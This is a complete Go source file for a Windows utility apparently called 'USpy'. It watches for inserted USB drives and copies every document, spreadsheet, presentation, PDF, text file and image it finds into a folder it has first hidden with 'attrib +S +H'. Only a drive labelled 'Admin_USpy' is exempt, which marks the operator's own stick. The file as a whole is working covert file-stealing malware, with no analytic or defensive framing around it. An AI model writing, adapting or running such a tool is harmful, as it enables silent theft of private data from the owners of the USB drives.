package main

import (
	"flag"
	"io"
	"os"
	"os/exec"
	"sort"
	"strings"
	"time"

	"github.com/google/go-cmp/cmp"
	"github.com/shirou/gopsutil/v4/disk"
	"golang.org/x/sys/windows"
)

func getDriveLabel(drive string) string {
	_volume_name := make([]uint16, windows.MAX_PATH+1)
	var volume_serial_number, maximum_component_length, file_system_flags uint32
	fileSystemName := make([]uint16, windows.MAX_PATH+1)

	windows.GetVolumeInformation(
		windows.StringToUTF16Ptr(drive),
		&_volume_name[0],
		uint32(len(_volume_name)),
		&volume_serial_number,
		&maximum_component_length,
		&file_system_flags,
		&fileSystemName[0],
		uint32(len(fileSystemName)),
	)

	volume_name := windows.UTF16ToString(_volume_name)
	if volume_name == "" {
		return "Unknown"
	}
	return volume_name
}

func listUSBDrives() []string {
	drives, _ := disk.Partitions(false)

	var usb_drives []string
	for _, drive := range drives {
		drive_type := windows.GetDriveType(windows.StringToUTF16Ptr(drive.Mountpoint))
		if drive_type == 2 {
			usb_drives = append(usb_drives, drive.Mountpoint+"/")
		}
	}

	return usb_drives
}

func scanFolder(path string) ([]string, []string) {
	items, _ := os.ReadDir(path)

	var folders, files []string
	for _, item := range items {
		if item.IsDir() {
			folders = append(folders, path+item.Name()+"/")
		} else {
			files = append(files, path+item.Name())
		}
	}

	return folders, files
}

func scanDisk(drive string, scan_level int) []string {
	var folders, files []string
	folders = append(folders, drive)

	for i := 0; i < scan_level; i++ {
		var _folders, _files []string
		for _, folder := range folders {
			__folders, __files := scanFolder(folder)
			_folders = append(_folders, __folders...)
			_files = append(_files, __files...)
		}

		folders = _folders
		files = append(files, _files...)
	}

	return files
}

func in(slice []string, target string) bool {
	sort.Strings(slice)
	index := sort.SearchStrings(slice, target)
	if index < len(slice) && slice[index] == target {
		return true
	}
	return false
}

func filter(files, scan_rules []string) []string {
	var filtered_files []string
	for _, file := range files {
		file_split := strings.Split(file, ".")
		file_ext := file_split[len(file_split)-1]
		if in(scan_rules, file_ext) {
			filtered_files = append(filtered_files, file)
		}
	}

	return filtered_files
}

func copy(src_path, dst_path string) {
	_, err := os.Stat(dst_path)
	if os.IsNotExist(err) {
		src, _ := os.Open(src_path)
		defer src.Close()

		dst, _ := os.Create(dst_path)
		defer dst.Close()

		io.Copy(dst, src)
	}
}

func copyToTemp(files []string, temp_path string) {
	for _, file := range files {
		temp_file := strings.Split(temp_path+file[3:], "/")
		temp_file = temp_file[:len(temp_file)-1]

		go os.MkdirAll(strings.Join(temp_file, "/"), os.ModePerm)
	}

	for _, file := range files {
		temp_file := temp_path + file[3:]
		go copy(file, temp_file)
	}
}

func main() {
	var _scan_rules string
	var scan_level int
	var admin_name string
	var temp_path string
	flag.StringVar(&_scan_rules, "scan-rules", "ppt,pptx,xls,xlsx,doc,docx,pdf,txt,jpg,jpeg,png,bmp,gif", "Scan rules")
	flag.IntVar(&scan_level, "scan-level", 20, "Scan level")
	flag.StringVar(&admin_name, "admin-name", "Admin_USpy", "Admin USB volume name")
	flag.StringVar(&temp_path, "temp-path", "D:/USpy/", "Temporary folder path")
	flag.Parse()
	scan_rules := strings.Split(_scan_rules, ",")

	os.MkdirAll(temp_path, os.ModePerm)
	exec.Command("attrib", "+S", "+H", "/D", temp_path[:len(temp_path)-1]).Run()

	var _usb_drives []string
	for {
		time.Sleep(1 * time.Second)

		usb_drives := listUSBDrives()
		if cmp.Equal(_usb_drives, usb_drives) {
			continue
		}
		_usb_drives = usb_drives

		for _, usb_drive := range usb_drives {
			usb_drive_label := getDriveLabel(usb_drive)

			if usb_drive_label != admin_name {
				files := scanDisk(usb_drive, scan_level)
				files = filter(files, scan_rules)
				copyToTemp(files, temp_path+"/"+usb_drive_label+"/")
			}
		}
	}
}
